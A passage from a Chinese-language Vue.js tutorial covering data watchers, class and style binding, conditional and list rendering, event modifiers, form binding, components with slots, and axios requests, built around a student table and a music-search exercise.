&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;input type=\"text\" v-model=\"str1\"/&gt;&lt;br/&gt; &lt;input type=\"text\" v-model=\"str2\"/&gt;&lt;br/&gt; {{str3}} &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ str1:\"千锋\", str2:\"武汉\", str3:\"千锋武汉\" }, watch:{ str1:function(){ this.str3 = this.str1 +this.str2; }, str2:function(){ this.str3 = this.str1 +this.str2; } } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 六、class与style绑定 我们可以使用mustache语法将vue中data的数据绑定到HTML标签及标签的属性，如何将data中的值绑定到标签的class及style属性呢？ 6.1 class绑定&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=\"text/css\"&gt; .mystyle1{ width: 200px; height: 100px; background: orange; } .mystyle3{ width: 200px; height: 100px; background: black; } .my-style2{ border-radius: 10px; } &lt;/style&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;!--如果b1为true就加载 mystyle1；如果b2为true，则加载my-style2--&gt; &lt;div :class=\"{mystyle1:b1,'my-style2':b2}\"&gt;&lt;/div&gt; &lt;!--为class属性加载多个样式名 --&gt; &lt;div :class=\"[chooseStyle1,chooseStyle2]\"&gt;&lt;/div&gt; &lt;!--如果b3为true，则class='mystyle3'; 否则class='mystyle1' 如果在三目运算中使用样式名则需加单引号，不加单引号则表示从data变量中获取样式名--&gt; &lt;div :class=\"[b3 ? 'mystyle3' : 'mystyle1']\"&gt;&lt;/div&gt; &lt;div :class=\"[b3 ? chooseStyle3 : chooseStyle1]\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ b1:true, b2:true, b3:false, chooseStyle1:\"mystyle1\", chooseStyle2:\"my-style2\", chooseStyle3:\"mystyle3\" } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 6.2 style绑定&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;!--当使用v-bind绑定内联样式时： 1. 使用{}定义style样式，才能获取data中的值，{}要遵循JSON格式 2. {}中不在使用style样式属性名“font-size”,而要使用对应的js属性名 border-style-width --- borderStyleWidth --&gt; &lt;div v-bind:style=\"{color: colorname,fontSize: fontsize+'px' }\"&gt;WH2010&lt;/div&gt; &lt;!--我们可以直接为style属性绑定一个data中定义好的内联样式的字符串--&gt; &lt;div v-bind:style=\"mystyle1\"&gt;千锋Java-WH2010&lt;/div&gt; &lt;!--我们可以直接为style属性绑定一个data中定义好的内联样式的对象--&gt; &lt;div v-bind:style=\"mystyle2\"&gt;千锋Java-WH2010&lt;/div&gt; &lt;!--可以在同一个style上通过数组引用多个内联样式的对象--&gt; &lt;div v-bind:style=\"[mystyle2,mystyle3]\"&gt;千锋Java-WH2010&lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ colorname:\"green\", fontsize:30, mystyle1:\"color:orange;font-size:45px\", mystyle2:{ color:\"blue\", fontSize:\"40px\" }, mystyle3:{ textShadow:\"orange 3px 3px 5px\" } } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 七、条件与列表渲染7.1 条件渲染7.1.1 v-if 在html标签可以添加v-if指令指定一个条件，如果条件成立则显示此HTML标签，如果不成立则不显示当前标签； 条件可以是一个表达式也可以是一个具体的bool类型值 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;h3 v-if=\"b\"&gt;从前有座山&lt;/h3&gt; &lt;h3 v-if=\"code == 1\"&gt;从前有座山&lt;/h3&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ code:2, b:false } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 7.1.2 v-else&lt;div id=\"container\"&gt; &lt;!--v-else标签需要紧跟在v-if的标签之后，中间不能有其他标签--&gt; &lt;h3 v-if=\"code == 1\"&gt;从前有座山&lt;/h3&gt; &lt;h3 v-else&gt;山里有座庙&lt;/h3&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ code:1 } }); &lt;/script&gt; 7.1.3 v-else-if&lt;div id=\"container\"&gt; &lt;h3 v-if=\"code &gt;= 90\"&gt;优秀&lt;/h3&gt; &lt;h3 v-else-if=\"code &gt;= 80\"&gt;良好&lt;/h3&gt; &lt;h3 v-else-if=\"code &gt;= 70\"&gt;中等&lt;/h3&gt; &lt;h3 v-else-if=\"code &gt;= 60\"&gt;及格&lt;/h3&gt; &lt;h3 v-else&gt;不想理你&lt;/h3&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ code:85 } }); &lt;/script&gt; 7.1.4 v-show 从功能上将v-show和v-if作用是相同的，渲染过程有区别 v-if 是“真正”的条件渲染，因为它会确保在切换过程中条件块内的事件监听器和子组件适当地被销毁和重建。 v-if 也是惰性的：如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染条件块。 相比之下，v-show 就简单得多——不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换。 一般来说，v-if 有更高的切换开销，而 v-show 有更高的初始渲染开销。因此，如果需要非常频繁地切换，则使用 v-show 较好；如果在运行时条件很少改变，则使用 v-if 较好。 7.2 列表渲染 将集合数据以表格、列表的形式显示 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"css/bootstrap.css\" /&gt; &lt;script type=\"text/javascript\" src=\"js/jquery-3.4.1.min.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/bootstrap.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;ul&gt; &lt;li v-for=\"c in categories\"&gt; &lt;a :href=\"'query?cid='+c.cid\"&gt;{{c.cname}}&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;table class=\"table table-bordered\"&gt; &lt;tr&gt; &lt;th&gt;学号&lt;/th&gt; &lt;th&gt;照片&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;性别&lt;/th&gt; &lt;th&gt;年龄&lt;/th&gt; &lt;th&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;template v-for=\"s,index in stus\"&gt; &lt;tr :id=\"'tr'+s.stuNum\"&gt; &lt;td&gt;{{s.stuNum}}&lt;/td&gt; &lt;td&gt; &lt;img height=\"30\" :src=\"s.stuImg\"/&gt; &lt;/td&gt; &lt;td&gt;{{s.stuName}}&lt;/td&gt; &lt;td&gt; &lt;!--{{s.stuGender=='M'?'男':'女'}}--&gt; &lt;img v-if=\"s.stuGender=='M'\" src=\"img/m.bmp\"&gt; &lt;img v-else src=\"img/f.bmp\"&gt; &lt;/td&gt; &lt;td&gt;{{s.stuAge}}&lt;/td&gt; &lt;td&gt; &lt;a class=\"btn btn-danger btn-xs\" :href=\"'stu/delete?cid='+s.stuNum\"&gt;删除&lt;/a&gt; &lt;a class=\"btn btn-success btn-xs\" :href=\"'stu/update?cid='+s.stuNum\"&gt;修改&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/template&gt; &lt;/table&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ categories:[ { cid:1, cname:\"华为\" }, { cid:2, cname:\"小米\" }, { cid:3, cname:\"OPPO\" }, { cid:4, cname:\"VIVO\" } ], stus:[ { stuNum:\"10010\", stuImg:\"img/01.jpg\", stuName:\"Tom\", stuGender:\"M\", stuAge:20 }, { stuNum:\"10011\", stuImg:\"img/02.jpg\", stuName:\"LiLei\", stuGender:\"M\", stuAge:20 }, { stuNum:\"10012\", stuImg:\"img/03.jpg\", stuName:\"Lucy\", stuGender:\"F\", stuAge:20 }, { stuNum:\"10013\", stuImg:\"img/04.jpg\", stuName:\"Polly\", stuGender:\"F\", stuAge:20 } ] } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 八、事件处理 在使用vue进行数据渲染时，如果使用原生js事件绑定(例如onclick)，如果需要获取vue实例中的数据并传参则需要通过拼接来完成 vue提供了v-on指令用于绑定各种事件（v-on:click），简化了从vue取值的过程，但是触发的方法需要定义在vue实例的 methods中 &lt;button type=\"button\" v-on:click=\"doDelete(s.stuNum,s.stuName)\"&gt;删除&lt;/button&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{}, methods:{ doDelete:function(snum,sname){ console.log(\"----delete:\"+snum+\" \"+sname) } } }); &lt;/script&gt; v-on:clicl可以缩写为@click 8.1 使用JS函数传值&lt;button type=\"button\" class=\"btn btn-danger btn-xs\" v-on:click=\"doDelete(s.stuNum,s.stuName)\"&gt;删除&lt;/button&gt; &lt;script&gt; var vm = new Vue({ el:\"#container\", data:{}; methods:{ doDelete:function(snum,sname){ console.log(\"----delete:\"+snum+\" \"+sname) } } }); &lt;/script&gt; 8.2 使用dataset对象传值&lt;button type=\"button\" class=\"btn btn-success btn-xs\" @click=\"doUpdate\" :data-snum=\"s.stuNum\" :data-sname=\"s.stuName\" :data-simg=\"s.stuImg\"&gt;修改&lt;/button&gt; &lt;script&gt; var vm = new Vue({ el:\"#container\", data:{}; methods:{ doUpdate:function(event){ //如果v-on绑定的js函数没有参数，调用的时候可以省略()，同时可以给js函数一个event参数(事件对象) // 1. event 表示触发当前函数的事件 // 2. event.srcElement 表示发生事件的元素---修改按钮 // 3. event.srcElement.dataset 表示按钮上绑定的数据集（data-开头的属性） console.log(\"-----update\") var stu = event.srcElement.dataset; } } }); &lt;/script&gt; 8.3 混合使用 $event &lt;button type=\"button\" class=\"btn btn-danger btn-xs\" v-on:click=\"doDelete(s.stuNum,s.stuName,$event)\":data-simg=\"s.stuImg\"&gt;删除&lt;/button&gt; &lt;script&gt; var vm = new Vue({ el:\"#container\", data:{}; methods:{ doDelete:function(snum,sname,event){ console.log(\"----delete:\"+snum+\" \"+sname) console.log(event.srcElement.dataset); } } }); &lt;/script&gt; 8.4 事件修饰符 当使用v-on进行事件绑定的时候，可以添加特定后缀，设置事件触发的特性 8.4.1 事件修饰符使用示例&lt;button type=\"submit\" @click.prevent=\"事件函数\"&gt;测试&lt;/button&gt; 8.4.2 事件修饰符.prevent 消除元素的默认事件 &lt;div id=\"container\"&gt; &lt;form action=\"https://www.baidu.com\"&gt; &lt;button type=\"submit\" class=\"btn btn-success btn-xs\" @click.prevent=\"test\"&gt;测试&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ }, methods:{ test:function(){ console.log(\"---test\"); } } }); &lt;/script&gt; .stop 阻止事件冒泡（阻止子标签向上冒泡） .self 设置只能自己触发事件（子标签不能触发） &lt;div id=\"container\"&gt; &lt;div style=\"width: 200px; height: 200px; background: red;\" @click.self=\"method1\"&gt; &lt;div style=\"width: 150px; height: 150px; background: green;\" @click=\"method2\"&gt; &lt;button type=\"button\" @click.stop=\"method3\"&gt;测试&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ }, methods:{ method1:function(){ alert(\"1\"); }, method2:function(){ alert(\"2\"); }, method3:function(){ alert(\"3\"); } } }); &lt;/script&gt; .once 限定事件只触发一次 8.4.3 按键修饰符 按键修饰符就是针对键盘事件的修饰符，限定哪个按键会触发事件 &lt;input type=\"text\" @keyup.enter=\"method4\"/&gt; .enter .tab .delete (捕获“删除”和“退格”键) .esc .space .up .down .left .right 除了以上vue提供按钮的别名之外，我们还可以根据键盘为按键自定义别名 键盘码 示例： &lt;div id=\"container\"&gt; &lt;!--2.使用自定义的按键别名aaa作为修饰符--&gt; &lt;input type=\"text\" @keyup.aaa=\"method4\"/&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; //1.为按键J定于别名为 aaa Vue.config.keyCodes.aaa =74; var vm = new Vue({ el:\"#container\", data:{}, methods:{ method4:function(){ alert(\"4\"); } } }); &lt;/script&gt; 8.4.3 系统修饰符 组合键 示例 ctrl+j触发事件 &lt;div id=\"container\"&gt; &lt;input type=\"text\" @keyup.ctrl.j=\"method4\"/&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; Vue.config.keyCodes.j =74; var vm = new Vue({ el:\"#container\", data:{}, methods:{ method4:function(){ alert(\"4\"); } } }); &lt;/script&gt; .ctrl .alt .shift .meta windows键 九、表单输入绑定 表单输入绑定，即双向绑定：就是能够将vue实例的data数据渲染到表单输入视图（input\\textarea\\select），也能够将输入视图的数据同步更新到vue实例的data中 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"css/bootstrap.css\" /&gt; &lt;script type=\"text/javascript\" src=\"js/jquery-3.4.1.min.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/bootstrap.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;!--文本输入框、密码输入框--&gt; &lt;input type=\"text\" v-model=\"text\"/&gt;&lt;br/&gt; &lt;input type=\"password\" v-model=\"pwd\"/&gt;&lt;br/&gt; &lt;!--单选按钮--&gt; &lt;input type=\"radio\" v-model=\"opt1\" value=\"A\"/&gt;A 3 &lt;input type=\"radio\" v-model=\"opt1\" value=\"B\"/&gt;B 4 &lt;input type=\"radio\" v-model=\"opt1\" value=\"C\"/&gt;C 5 &lt;input type=\"radio\" v-model=\"opt1\" value=\"D\"/&gt;D 6 &lt;br/&gt; &lt;!--复选框，绑定的是一个数组--&gt; &lt;input type=\"checkbox\" v-model=\"opt2\" value=\"篮球\"/&gt;篮球 &lt;br/&gt; &lt;input type=\"checkbox\" v-model=\"opt2\" value=\"足球\"/&gt;足球 &lt;br/&gt; &lt;input type=\"checkbox\" v-model=\"opt2\" value=\"羽毛球\"/&gt;羽毛球 &lt;br/&gt; &lt;input type=\"checkbox\" v-model=\"opt2\" value=\"乒乓球\"/&gt;乒乓球&lt;br/&gt; &lt;!--下拉菜单select：绑定一个字符串--&gt; &lt;select v-model=\"city\"&gt; &lt;option value=\"BJ\"&gt;北京&lt;/option&gt; &lt;option value=\"SH\"&gt;上海&lt;/option&gt; &lt;option value=\"GZ\"&gt;广州&lt;/option&gt; &lt;option value=\"SZ\"&gt;深圳&lt;/option&gt; &lt;/select&gt; &lt;br/&gt; &lt;!--下拉菜单select：如果有multiple表示可多选，需要绑定一个数组--&gt; &lt;select v-model=\"cities\" multiple&gt; &lt;option value=\"BJ\"&gt;北京&lt;/option&gt; &lt;option value=\"SH\"&gt;上海&lt;/option&gt; &lt;option value=\"GZ\"&gt;广州&lt;/option&gt; &lt;option value=\"SZ\"&gt;深圳&lt;/option&gt; &lt;/select&gt; &lt;br/&gt; &lt;button type=\"button\" @click=\"doSearch\"&gt;测试&lt;/button&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ text:\"aaa\", pwd:\"111111\", opt1:\"C\", opt2:[\"篮球\",\"羽毛球\"], city:\"SZ\", cities:[\"BJ\",\"SZ\"] }, methods:{ doSearch:function(){ alert(vm.cities); } } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 十、vue使用案例10.1 接口说明 接口名称 功能描述 根据关键字搜索音乐信息 请求URL http://47.96.11.185:9999/music/search 请求方式 GET | POST 请求参数 s string [必须] 搜索关键字limit int [可选] 返回的搜索结果的条数，默认为10type int [可选] 搜索类型(1单曲 10歌单)，默认为1offset int [可选] 搜索结果的偏移 返回结果 10.2 如何部署jar文件java -jar music-1.0.0.jar 10.3 案例目标请大家根据以上接口实现搜索和列表显示功能 10.4 案例实现10.4.1 音乐搜索10.4.2 音乐播放 在music.html中定义音频播放器(定义在vue的容器之外) &lt;audio controls style=\"width:100%\" src=\"\" id=\"player\"&gt;&lt;/audio&gt; 给播放按钮绑定点击事件触发的函数doPlay &lt;button type=\"button\" class=\"btn btn-success btn-xs\" @click=\"doPlay\" :data-mid=\"song.id\"&gt;播放&lt;/button&gt; 在doPlay中执行播放 &lt;script type=\"text/javascript\"&gt; var player = document.getElementById(\"player\"); var vm = new Vue({ el:\"#container\", data:{ keyword:\"张韶涵\", songs:[], currentid:0 }, methods:{ doSearch:function(){ console.log(vm.keyword); $.get(\"http://localhost:9999/music/search\",{s:vm.keyword,limit:15,offset:0},function(res){ console.log(res); if(res.code==200){ //获取此关键词搜索的总记录数 var count = res.result.songCount; //获取音乐集合 var arr = res.result.songs; vm.songs = arr; }else{ vm.songs = data; } },\"json\"); }, doPlay:function(event){ vm.currentid = event.srcElement.dataset.mid; //网易云音乐播放地址： http://music.163.com/song/media/outer/url?id=songId player.src = \"http://music.163.com/song/media/outer/url?id=\"+vm.currentid; player.play(); } } }); &lt;/script&gt; 10.4.3 播放暂停切换十一、组件11.1 组件介绍及示例 组件，就是将通用的HTML模块进行封装——可复用 11.1.1 组件注册 将通用的HTML模块封装注册到vue中 Vue.component(\"header-bar\",{ }); 11.1.2 组件引用 定义组件需要依赖vue.js，在引用自定义组件的js文件之前要先引用vue.js 组件的引用必须在vue实例el指定的容器中 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;header-bar&gt;&lt;/header-bar&gt; &lt;/div&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/my-components.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 11.2 组件注册11.2.1 自定义组件的结构 data 定义组件的模板渲染的数据 template 组件的HTML模块（HTML标签\\css样式） methods 定义组件中的标签事件绑定的JS函数 Vue.component(\"header-bar\",{ data:function(){ //组件中的data是通过函数返回的对象 return { title:\"Java2010电商平台\" }; }, template:`&lt;div style=\"width: 100%; height: 80px; background: lightyellow;\"&gt; &lt;table width=\"100%\"&gt; &lt;tr&gt; &lt;td width=\"200\" align=\"right\" valign=\"middle\"&gt; &lt;img src=\"img/logo.png\" height=\"80\"&gt; &lt;/td&gt; &lt;td&gt; &lt;label style=\"color: deepskyblue;font-size:32px; font-family: 华文行楷; margin-left: 30px;\"&gt; {{title}} &lt;/label&gt; &lt;/td&gt; &lt;td&gt; &lt;button @click=\"test\"&gt;组件中的按钮&lt;/button&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt;`, methods:{ test:function(){ alert(\"组件中定义的函数\"); } } }); 11.2.2 组件的封装 将模版中的css样式提出取来，单独定义到css文件存储在css目录 将模版中的图片存在在img目录 将定义组件的js文件和vue的文件存放到js目录 vue组件封装的目录结构 11.2.3 组件的复用&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;title&gt;&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"css/my-components.css\" /&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;header-bar&gt;&lt;/header-bar&gt; &lt;/div&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/my-components.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\" }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 11.3 组件通信 vue实例本身就是一个组件（模板就是el指定容器 ,data就是组件数据,methods就是组件的事件函数）在vue实例指定的el容器中引用的组件称为子组件 ,当前vue实例就是父组件 11.3.1 父传子 vue实例引用组件的时候，传递数据到引用的组件中 示意图 11.3.2 子传父 通过子组件的按钮“调用”父组件的函数，通过函数传值 调用流程示意图 11.4 组件插槽 当我们自定义vue组件时，允许组件中的部分内容在调用组件时进行定义——插槽 11.4.1 插槽的使用 在自定义组件时通过slot标签在组件的模版中定义插槽 Vue.component(\"header-bar\",{ data:function(){ //组件中的data是通过函数返回的对象 return { str2:\"子组件中的数据\" }; }, template:`&lt;div class=\"divStyle\"&gt; &lt;table class=\"tableStyle\"&gt; &lt;tr&gt; &lt;td width=\"200\" align=\"right\" valign=\"middle\"&gt; &lt;img src=\"img/logo.png\" class=\"logoImg\"&gt; &lt;/td&gt; &lt;td&gt; &lt;label class=\"titleStyle\"&gt; {{title}} &lt;/label&gt; &lt;/td&gt; &lt;td&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/td&gt; &lt;td&gt; &lt;button @click=\"childMethod\"&gt;子组件中的按钮&lt;/button&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt;`, props:[\"title\"], methods:{ childMethod:function(){ this.$emit(\"my-event\",this.str2); } } }); 在父组件中调用此组件时，指定插槽填充的模版 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"css/bootstrap.css\" /&gt; &lt;link rel=\"stylesheet\" href=\"css/my-components.css\" /&gt; &lt;script type=\"text/javascript\" src=\"js/jquery-3.4.1.min.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/bootstrap.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;header-bar :title=\"sss\"&gt; &lt;!--组件标签包含的HTML默认为填充到插槽的模版--&gt; &lt;input/&gt;&lt;button&gt;搜索&lt;/button&gt; &lt;/header-bar&gt; &lt;/div&gt; &lt;script type=\"text/javascript\" src=\"js/my-components.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ sss:\"自定义标题\" } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 11.4.2 具名插槽 当组件中的插槽数量&gt;1时，需要给组件中的slot标签添加name属性指定插槽的名字 定义组件： Vue.component(\"page-frame\",{ template:`&lt;div&gt; &lt;div id=\"header\" style=\"width:100%; height:100px;background:pink\"&gt; &lt;slot name=\"s1\"&gt;&lt;/slot&gt; &lt;/div&gt; &lt;div style=\"width:100%; height:580px\"&gt; &lt;slot name=\"s2\"&gt;&lt;/slot&gt; &lt;/div&gt; &lt;div id=\"footer\" style=\"width:100%; height:40px;background:lightgray\"&gt;{{cr}}&lt;/div&gt; &lt;/div&gt;`, props:[\"title\",\"cr\"] }); 引用组件 template &lt;div id=\"container\"&gt; &lt;page-frame title=\"标题\" cr=\"千锋武汉\"&gt; &lt;!--定义一个模版，填充到组件的name=s1的 插槽--&gt; &lt;template slot=\"s1\"&gt; &lt;input type=\"text\" placeholder=\"歌曲名、歌手\" /&gt; &lt;button type=\"button\" @click=\"doSearch\"&gt;搜索&lt;/button&gt; &lt;/template&gt; &lt;!--定义一个模版，填充到组件的name=s2的 插槽--&gt; &lt;template slot=\"s2\"&gt; &lt;table class=\"table table-bordered table-condensed\"&gt; &lt;tr&gt; &lt;th&gt;序号&lt;/th&gt; &lt;th&gt;歌曲ID&lt;/th&gt; &lt;th&gt;歌曲名&lt;/th&gt; &lt;th&gt;歌手&lt;/th&gt; &lt;th&gt;专辑&lt;/th&gt; &lt;th&gt;时长&lt;/th&gt; &lt;th&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/template&gt; &lt;/page-frame&gt; &lt;/div&gt; 11.4.3 插槽作用域 定义组件时，将组件中的数据绑定到slot标签 Vue.component(\"page-frame\",{ template:`&lt;div&gt; &lt;div id=\"header\" style=\"width:100%; height:100px;background:pink\"&gt; &lt;slot name=\"s1\"&gt;&lt;/slot&gt; &lt;/div&gt; &lt;div style=\"width:100%; height:580px\"&gt; &lt;slot name=\"s2\" v-bind:musics=\"songs\"&gt;&lt;/slot&gt; &lt;/div&gt; &lt;div id=\"footer\" style=\"width:100%; height:40px;background:lightgray\"&gt;{{cr}}&lt;/div&gt; &lt;/div&gt;`, props:[\"title\",\"cr\"], data:function(){ return { songs:[ {},{} ] }; } }); 引用组件时，在填充插槽的模版上使用slot-scopt属性获取插槽绑定的值 &lt;page-frame title=\"标题\" cr=\"千锋武汉\"&gt; &lt;template slot=\"s1\"&gt; &lt;input type=\"text\" placeholder=\"歌曲名、歌手\" /&gt; &lt;button type=\"button\" @click=\"doSearch\"&gt;搜索&lt;/button&gt; &lt;/template&gt; &lt;!--在使用模版填充组件插槽时，可以使用slot-scope属性获取组件插槽绑定的数据的集合 --&gt; &lt;template slot=\"s2\" slot-scope=\"res\"&gt; &lt;table class=\"table table-bordered table-condensed\"&gt; &lt;tr&gt; &lt;th&gt;序号&lt;/th&gt; &lt;th&gt;歌曲ID&lt;/th&gt; &lt;th&gt;歌曲名&lt;/th&gt; &lt;th&gt;歌手&lt;/th&gt; &lt;th&gt;专辑&lt;/th&gt; &lt;th&gt;时长&lt;/th&gt; &lt;th&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;tr v-for=\"song,index in res.musics\"&gt; &lt;td&gt;{{index+1}}&lt;/td&gt; &lt;td&gt;{{song.id}}&lt;/td&gt; &lt;td&gt; {{song.name}} &lt;/td&gt; &lt;td&gt; &lt;span v-for=\"artist in song.artists\"&gt; &amp;nbsp;{{artist.name}} &lt;/span&gt; &lt;/td&gt; &lt;td&gt;{{song.album.name}}&lt;/td&gt; &lt;td width=\"8%\"&gt; {{ Math.floor( Math.round(song.duration/1000)/60) &lt; 10 ? '0'+Math.floor( Math.round(song.duration/1000)/60) : Math.floor( Math.round(song.duration/1000)/60) }} : {{ Math.round(song.duration/1000)%60 &lt;10 ? '0'+( Math.round(song.duration/1000)%60 ) : Math.round(song.duration/1000)%60 }} &lt;/td&gt; &lt;td width=\"10%\"&gt; &lt;button type=\"button\" class=\"btn btn-primary btn-xs\"&gt;播放&lt;/button&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/template&gt; &lt;/page-frame&gt; 十二、axios12.1 axios介绍 vue可以实现数据的渲染，但是如何获取数据呢？ vue本身不具备通信能力，通常结合axios—一个专注于异步通信的js框架来使用 axios 数据通信 vue 数据渲染 12.2 axios入门使用 原生ajax — 实现步骤复杂 jQuery 笨重 axios 简洁、高效，对RESTful支持良好 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/axios.min.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;button type=\"button\" @click=\"test1\"&gt;测试1&lt;/button&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", methods:{ test1:function(){ //发送异步请求 // axios.get(url).then(fn); // axios.get(url,{}).then(fn) axios.get(\"http://localhost:9999/music/detail\",{ params:{ id:\"25640392\" } }) .then(function(res){ console.log(res); }); } } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 12.3 axios异步请求方法 axios提供了多种异步请求方法，实现对RESTful风格的支持 12.3.1 get请求 axios.get(url).then(fn); axios.get(url,{}).then(fn) //使用axios的get请求传递参数，需要将参数设置在params下 axios.get(\"http://localhost:9999/music/detail\",{ params:{ id:\"25640392\" } }) .then(function(res){ console.log(res); }); 12.3.2 post请求 axios.post(url,{}).then(fn) axios.post(\"http://localhost:9999/music/search\",{s:\"阿刁\"}) .then(function(res){ console.log(res); }); 12.3.3 自定义请求 自定义请求：自定义请求方式、请求参数、请求头、请求体（post） axios({ url:\"http://localhost:9999/music/search\", method:\"post\", params:{ //设置请求行传值 s:\"成都\", limit:15 }, headers:{ //设置请求头 }, data:{ //设置请求体（post/put） } }).then(function(res){ console.log(res) }); 12.3.4 其他 delete put option 12.4 并发请求&lt;div id=\"container\"&gt; &lt;button type=\"button\" @click=\"test1\"&gt;测试1&lt;/button&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new 